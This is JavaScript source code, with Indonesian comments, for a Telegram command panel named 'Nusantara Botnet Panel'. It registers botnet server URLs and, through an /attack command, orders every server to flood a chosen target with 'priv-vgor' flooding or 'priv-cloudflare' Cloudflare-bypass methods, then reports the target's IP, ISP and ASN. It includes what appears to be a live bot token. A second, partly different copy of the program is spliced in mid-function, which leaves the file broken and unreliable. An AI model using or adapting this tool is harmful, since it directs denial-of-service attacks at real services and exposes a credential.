const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');

// Token dari BotFather
const token = '8523473289:AAHY-HzYcbbULBH0wKOZqNfvl9AtAHO9srw';
const allowedId = 8084582143;

// Inisialisasi bot
const bot = new TelegramBot(token, { polling: true });

// File untuk menyimpan data botnet
const botnetFile = path.join(__dirname, 'botnet.json');

// Inisialisasi file botnet jika belum ada
if (!fs.existsSync(botnetFile)) {
  fs.writeFileSync(botnetFile, JSON.stringify({ endpoints: [] }, null, 2));
}

// Load data botnet
function loadBotnet() {
  try {
    return JSON.parse(fs.readFileSync(botnetFile, 'utf8'));
  } catch (error) {
    return { endpoints: [] };
  }
}

// Save data botnet
function saveBotnet(data) {
  fs.writeFileSync(botnetFile, JSON.stringify(data, null, 2));
}

// Test koneksi endpoint
async function testEndpoint(endpoint) {
  try {
    const response = await fetch(`${endpoint}?target=test.com&time=1&methods=priv-vgor`, { 
      timeout: 10000 
    });
    return response.status === 200;
  } catch (error) {
    return false;
  }
}

// Get target info
async function getTargetInfo(target) {
  try {
    const cleanTarget = target.replace(/^https?:\/\//, '');
    const response = await fetch(`http://ip-api.com/json/${cleanTarget}?fields=isp,query,as,country,org`);
    return await response.json();
  } catch (error) {
    return null;
  }
}

// Launch attack ke semua endpoints - TANPA MAPPING, LANGSUNG KIRIM METHOD ASLI
async function launchAttack(target, time, method) {
  const botnetData = loadBotnet();
  let successCount = 0;

  const cleanTarget = target.replace(/^https?:\/\//, '');

  // Kirim attack ke semua endpoints dengan method asli (priv-vgor / priv-cloudflare)
  for (const endpoint of botnetData.endpoints) {
    try {
      const attackUrl = `${endpoint}?target=${cleanTarget}&time=${time}&methods=${method}`;
      const response = await fetch(attackUrl, { timeout: 15000 });
      
      if (response.status === 200) {
        successCount++;
      }
    } catch (error) {
      console.log(`Error sending to ${endpoint}: ${error.message}`);
    }
  }

  return {
    success: successCount > 0,
    successCount,
    totalEndpoints: botnetData.endpoints.length,
    target: cleanTarget,
    time,
    method: method
  };
}

// Check semua endpoints
async function checkEndpoints() {
  const botnetData = loadBotnet();
  const validEndpoints = [];
  let onlineCount = 0;

  for (const endpoint of botnetData.endpoints) {
    const isOnline = await testEndpoint(endpoint);
    if (isOnline) {
      validEndpoints.push(endpoint);
      onlineCount++;
    }
  }

  // Update dengan endpoints yang valid
  botnetData.endpoints = validEndpoints;
  saveBotnet(botnetData);

  return { 
    onlineCount, 
    total: botnetData.endpoints.length,
    endpoints: validEndpoints
  };
}

console.log('🤖 Nusantara Botnet Telegram Panel Started!');

// Handle messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userId = msg.from.id;

  // Cek user yang diizinkan
  if (userId !== allowedId) {
    return bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan bot ini');
  }

  const args = text.split(' ');

  try {
    // START/HELP COMMAND
    if (text === '/start' || text === '/help') {
      return bot.sendMessage(chatId, `🤖 *Nusantara Botnet Panel*

*Available Commands:*
▢ /addvps <url> - Add botnet server
▢ /listvps - List all servers
▢ /check - Check servers status  
▢ /methods - Show attack methods
▢ /attack <target> <time> <method> - Launch attack
▢ /help - Show this help

*Examples:*
/addvps http://1.1.1.1:9032/Nusantara
/attack https://example.com 60 priv-vgor

*Current Methods:*
• priv-vgor - Private methods good flooding
• priv-cloudflare - Private methods bypass cloudflare`, { parse_mode: 'Markdown' });
    }

    // ADDVPS COMMAND - Add server to botnet
    if (text.startsWith('/addvps')) {
      if (args.length < 2) {
        return bot.sendMessage(chatId, '❌ Format: /addvps <url>\nContoh: /addvps http://1.1.1.1:9032/Nusantara');
      }

      let endpoint = args[1];
      if (!endpoint.startsWith('http')) {
        endpoint = 'http://' + endpoint;
      }

      // Test endpoint connection
      await bot.sendMessage(chatId, '🔄 Testing server connection...');
      const isOnline = await testEndpoint(endpoint);

      if (!isOnline) {
        return bot.sendMessage(chatId, '❌ Server tidak merespon atau offline');
      }

      // Add to botnet
      const botnetData = loadBotnet();
      
      // Cek jika endpoint sudah ada
      if (botnetData.endpoints.includes(endpoint)) {
        return bot.sendMessage(chatId, '❌ Server sudah terdaftar');
      }

      botnetData.endpoints.push(endpoint);
      saveBotnet(botnetData);

      return bot.sendMessage(chatId, `✅ *Server Added Successfully!*

*Server:* ${endpoint}
*Total Servers:* ${botnetData.endpoints.length}`, { parse_mode: 'Markdown' });
    }

    // LISTVPS COMMAND - List all servers
    if (text === '/listvps') {
      const botnetData = loadBotnet();
      
      if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, '❌ Tidak ada server yang terdaftar');
      }

      let listText = `📋 *Daftar Server (${botnetData.endpoints.length}):*\n\n`;
      botnetData.endpoints.forEach((endpoint, index) => {
        listText += `${index + 1}. ${endpoint}\n`;
      });

      return bot.sendMessage(chatId, listText, { parse_mode: 'Markdown' });
    }

    // CHECK COMMAND - Check servers status
    if (text === '/check') {
      await bot.sendMessage(chatId, '🔄 Checking semua server...');
      const result = await checkEndpoints();
      
      let statusText = `📊 *Server Status Report*\n\n`;
      statusText += `✅ Online: ${result.onlineCount}\n`;
      statusText += `❌ Offline: ${result.total - result.onlineCount}\n`;
      statusText += `📋 Total: ${result.total}\n\n`;
      
      if (result.onlineCount > 0) {
        statusText += `*Online Servers:*\n`;
        result.endpoints.forEach((endpoint, index) => {
          statusText += `${index + 1}. ${endpoint}\n`;
        });
      }
      
      statusText += `\nServer yang offline otomatis dihapus.`;

      return bot.sendMessage(chatId, statusText, { parse_mode: 'Markdown' });
    }

    // METHODS COMMAND - Show available methods
    if (text === '/methods') {
      const methodsText = `⚡ *Available Attack Methods*

*1. priv-vgor*
   → Type: Private flooding methods
   → Usage: /attack <target> <time> priv-vgor

*2. priv-cloudflare* 
   → Type: Private bypass Cloudflare methods
   → Usage: /attack <target> <time> priv-cloudflare

*Example:*
/attack https://example.com 60 priv-vgor`;

      return bot.sendMessage(chatId, methodsText, { parse_mode: 'Markdown' });
    }

    // ATTACK COMMAND - Launch attack
    if (text.startsWith('/attack')) {
      if (args.length < 4) {
        return bot.sendMessage(chatId, '❌ Format: /attack <target> <time> <method>\nContoh: /attack https://example.com 60 priv-vgor');
      }

      const target = args[1];
      const time = args[2];
      const method = args[3];

      // Validasi method
      if (method !== 'priv-vgor' && method !== 'priv-cloudflare') {
        return bot.sendMessage(chatId, '❌ Method tidak valid. Gunakan: priv-vgor atau priv-cloudflare');
      }

      // Validasi time
      if (isNaN(time) || time < 1) {
        return bot.sendMessage(chatId, '❌ Time harus angka dan minimal 1 detik');
      }

      const botnetData = loadBotnet();
      if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, '❌ Tidak ada server. Gunakan /addvps dulu');
      }

      // Get target info
      await bot.sendMessage(chatId, '🔄 Getting target information...');
      const targetInfo = await getTargetInfo(target);

      // Launch attack
      await bot.sendMessage(chatId, `🚀 *Launching ${method} Attack...*\n\nMengirim ke ${botnetData.endpoints.length} server...`, { parse_mode: 'Markdown' });
      
      const attackResult = await launchAttack(target, time, method);

      // Format hasil attack
      const now = new Date();
      const options = { 
        month: 'short', 
        day: 'numeric', 
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Asia/Jakarta' 
      };
      const formattedDate = new Date().toLocaleString('id-ID', options);

      let resultText = `⚡ *ATTACK RESULT*\n\n`;
      resultText += `▢ *Target:* ${attackResult.target}\n`;
      resultText += `▢ *Time:* ${attackResult.time} detik\n`;
      resultText += `▢ *Method:* ${attackResult.method}\n`;
      resultText += `▢ *Success:* ${attackResult.successCount}/${attackResult.totalEndpoints} servers\n`;
      resultText += `▢ *Sent:* ${formattedDate}\n\n`;

      if (targetInfo && targetInfo.query) {
        resultText += `📊 *TARGET INFO*\n`;
        resultText += `▢ *IP:* ${targetInfo.query}\n`;
        resultText += `▢ *ISP:* ${targetInfo.isp || 'N/A'}\n`;
        resultText += `▢ *ASN:* ${targetInfo.as || 'N/A'}\n`;
        resultText += `▢ *Country:* ${targetInfo.country || 'N/A'}\n`;
      }

      if (attackResult.success) {
        resultText += `\n✅ *Attack berhasil dikirim!*`;
      } else {
        resultText += `\n❌ *Gagal mengirim attack ke semua server*`;
      }

      return bot.sendMessage(chatId, resultText, { parse_mode: 'Markdown' });
    }

    // UNKNOWN COMMAND
    bot.sendMessage(chatId, '❌ Command tidak dikenali. Ketik /help untuk bantuan');

  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, '❌ Terjadi error saat memproses command');
  }
});

// Handle polling errors
bot.on('polling_error', (error) => {
  console.log('Polling error:', error);
});

// Bot startup message
console.log('✅ Bot is running...');
console.log('📝 Commands: /addvps, /listvps, /check, /methods, /attack');
console.log('🎯 Available methods: priv-vgor, priv-cloudflare');
  // Update dengan endpoints yang valid
  botnetData.endpoints = validEndpoints;
  saveBotnet(botnetData);

  return { 
    onlineCount, 
    total: botnetData.endpoints.length,
    endpoints: validEndpoints
  };
}

console.log('🤖 Nusantara Botnet Telegram Panel Started!');

// Handle messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userId = msg.from.id;

  // Cek user yang diizinkan
  if (userId !== allowedId) {
    return bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan bot ini');
  }

  const args = text.split(' ');

  try {
    // START/HELP COMMAND
    if (text === '/start' || text === '/help') {
      return bot.sendMessage(chatId, `🤖 *Nusantara Botnet Panel*

*Available Commands:*
▢ /addvps <url> - Add botnet server
▢ /listvps - List all servers
▢ /check - Check servers status  
▢ /methods - Show attack methods
▢ /attack <target> <time> <method> - Launch attack
▢ /help - Show this help

*Examples:*
/addvps http://1.1.1.1:9032/Nusantara
/attack https://example.com 60 priv-cloudflare

*Current Methods:*
• priv-vgor → H2-DOLBY
• priv-cloudflare → H2-BIPAS`, { parse_mode: 'Markdown' });
    }

    // ADDVPS COMMAND - Add server to botnet
    if (text.startsWith('/addvps')) {
      if (args.length < 2) {
        return bot.sendMessage(chatId, '❌ Format: /addvps <url>\nContoh: /addvps http://1.1.1.1:9032/Nusantara');
      }

      let endpoint = args[1];
      if (!endpoint.startsWith('http')) {
        endpoint = 'http://' + endpoint;
      }

      // Test endpoint connection
      await bot.sendMessage(chatId, '🔄 Testing server connection...');
      const isOnline = await testEndpoint(endpoint);

      if (!isOnline) {
        return bot.sendMessage(chatId, '❌ Server tidak merespon atau offline');
      }

      // Add to botnet
      const botnetData = loadBotnet();
      
      // Cek jika endpoint sudah ada
      if (botnetData.endpoints.includes(endpoint)) {
        return bot.sendMessage(chatId, '❌ Server sudah terdaftar');
      }

      botnetData.endpoints.push(endpoint);
      saveBotnet(botnetData);

      return bot.sendMessage(chatId, `✅ *Server Added Successfully!*

*Server:* ${endpoint}
*Total Servers:* ${botnetData.endpoints.length}`, { parse_mode: 'Markdown' });
    }

    // LISTVPS COMMAND - List all servers
    if (text === '/listvps') {
      const botnetData = loadBotnet();
      
      if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, '❌ Tidak ada server yang terdaftar');
      }

      let listText = `📋 *Daftar Server (${botnetData.endpoints.length}):*\n\n`;
      botnetData.endpoints.forEach((endpoint, index) => {
        listText += `${index + 1}. ${endpoint}\n`;
      });

      return bot.sendMessage(chatId, listText, { parse_mode: 'Markdown' });
    }

    // CHECK COMMAND - Check servers status
    if (text === '/check') {
      await bot.sendMessage(chatId, '🔄 Checking semua server...');
      const result = await checkEndpoints();
      
      let statusText = `📊 *Server Status Report*\n\n`;
      statusText += `✅ Online: ${result.onlineCount}\n`;
      statusText += `❌ Offline: ${result.total - result.onlineCount}\n`;
      statusText += `📋 Total: ${result.total}\n\n`;
      
      if (result.onlineCount > 0) {
        statusText += `*Online Servers:*\n`;
        result.endpoints.forEach((endpoint, index) => {
          statusText += `${index + 1}. ${endpoint}\n`;
        });
      }
      
      statusText += `\nServer yang offline otomatis dihapus.`;

      return bot.sendMessage(chatId, statusText, { parse_mode: 'Markdown' });
    }

    // METHODS COMMAND - Show available methods
    if (text === '/methods') {
      const methodsText = `⚡ *Available Attack Methods*

*1. priv-vgor*
   → Method: H2-DOLBY
   → Type: Private flooding H2/H1
   → Usage: /attack <target> <time> priv-vgor

*2. priv-cloudflare* 
   → Method: H2-BIPAS
   → Type: Private bypass Cloudflare
   → Usage: /attack <target> <time> priv-cloudflare

*Example:*
/attack https://example.com 60 priv-cloudflare`;

      return bot.sendMessage(chatId, methodsText, { parse_mode: 'Markdown' });
    }

    // ATTACK COMMAND - Launch attack
    if (text.startsWith('/attack')) {
      if (args.length < 4) {
        return bot.sendMessage(chatId, '❌ Format: /attack <target> <time> <method>\nContoh: /attack https://example.com 60 priv-cloudflare');
      }

      const target = args[1];
      const time = args[2];
      const method = args[3];

      // Validasi
      if (isNaN(time) || time < 1) {
        return bot.sendMessage(chatId, '❌ Time harus angka dan minimal 1 detik');
      }

      const botnetData = loadBotnet();
      if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, '❌ Tidak ada server. Gunakan /addvps dulu');
      }

      // Get target info
      await bot.sendMessage(chatId, '🔄 Getting target information...');
      const targetInfo = await getTargetInfo(target);

      // Launch attack
      await bot.sendMessage(chatId, `🚀 *Launching Attack...*\n\nMengirim ke ${botnetData.endpoints.length} server...`, { parse_mode: 'Markdown' });
      
      const attackResult = await launchAttack(target, time, method);

      // Format hasil attack
      const now = new Date();
      const options = { 
        month: 'short', 
        day: 'numeric', 
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Asia/Jakarta' 
      };
      const formattedDate = new Date().toLocaleString('id-ID', options);

      let resultText = `⚡ *ATTACK RESULT*\n\n`;
      resultText += `▢ *Target:* ${attackResult.target}\n`;
      resultText += `▢ *Time:* ${attackResult.time} detik\n`;
      resultText += `▢ *Method:* ${attackResult.method}\n`;
      resultText += `▢ *Success:* ${attackResult.successCount}/${attackResult.totalEndpoints} servers\n`;
      resultText += `▢ *Sent:* ${formattedDate}\n\n`;

      if (targetInfo && targetInfo.query) {
        resultText += `📊 *TARGET INFO*\n`;
        resultText += `▢ *IP:* ${targetInfo.query}\n`;
        resultText += `▢ *ISP:* ${targetInfo.isp || 'N/A'}\n`;
        resultText += `▢ *ASN:* ${targetInfo.as || 'N/A'}\n`;
        resultText += `▢ *Country:* ${targetInfo.country || 'N/A'}\n`;
      }

      if (attackResult.success) {
        resultText += `\n✅ *Attack berhasil dikirim!*`;
      } else {
        resultText += `\n❌ *Gagal mengirim attack ke semua server*`;
      }

      return bot.sendMessage(chatId, resultText, { parse_mode: 'Markdown' });
    }

    // UNKNOWN COMMAND
    bot.sendMessage(chatId, '❌ Command tidak dikenali. Ketik /help untuk bantuan');

  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, '❌ Terjadi error saat memproses command');
  }
});

// Handle polling errors
bot.on('polling_error', (error) => {
  console.log('Polling error:', error);
});

// Bot startup message
console.log('✅ Bot is running...');
console.log('📝 Commands: /addvps, /listvps, /check, /methods, /attack');
